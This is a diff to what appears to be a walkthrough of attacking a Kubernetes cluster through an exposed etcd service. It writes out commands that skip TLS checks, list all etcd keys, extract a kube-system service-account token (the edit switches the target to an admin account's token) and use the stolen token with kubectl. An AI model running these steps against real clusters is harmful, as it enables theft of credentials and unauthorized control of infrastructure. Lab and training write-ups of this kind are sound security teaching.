@@ -4,8 +4,8 @@
 2. Set the ETCD environment variable `export ETCDCTL_API=3`
 3. First we need to dump some secrets out of the etcd database 
   `etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=https://[CLUSTERIP]:2379 get / --prefix --keys-only`
-4. Then we'll need a service account token to authenticate to the cluster with
-  `etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=https://[IP]:2379 get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-[RAND]`
+4. Then we'll need a service account token to authenticate to the cluster with. Looking through the list of accounts we can see an admis-account
+  `etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=https://[IP]:2379 get /registry/secrets/kube-system//admins-account-token-[RAND]`
   The service account token starts with ey and ends just before the word `kubernetes.io` in the token. 
 5. With the service token we can use kubectl , first get the API pod name
   `kubectl --insecure-skip-tls-verify -shttps://[IP]:6443/ --token="[TOKEN]" -n kube-system get po`
